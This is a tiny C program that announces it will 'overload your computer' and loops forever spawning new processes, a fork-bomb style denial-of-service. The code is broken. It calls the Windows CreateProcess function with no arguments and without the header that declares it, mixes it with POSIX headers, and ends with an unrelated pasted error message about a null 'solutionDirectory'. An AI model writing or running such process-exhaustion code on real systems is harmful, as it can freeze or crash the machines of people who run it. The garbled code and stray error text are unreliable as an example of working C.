#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void main(void) {
	printf("This is a program that will overload your computer\n");
	while (1) {
		printf("forking\n");
		CreateProcess();
	}
}
//Value cannot be null.
//Parameter name: solutionDirectory
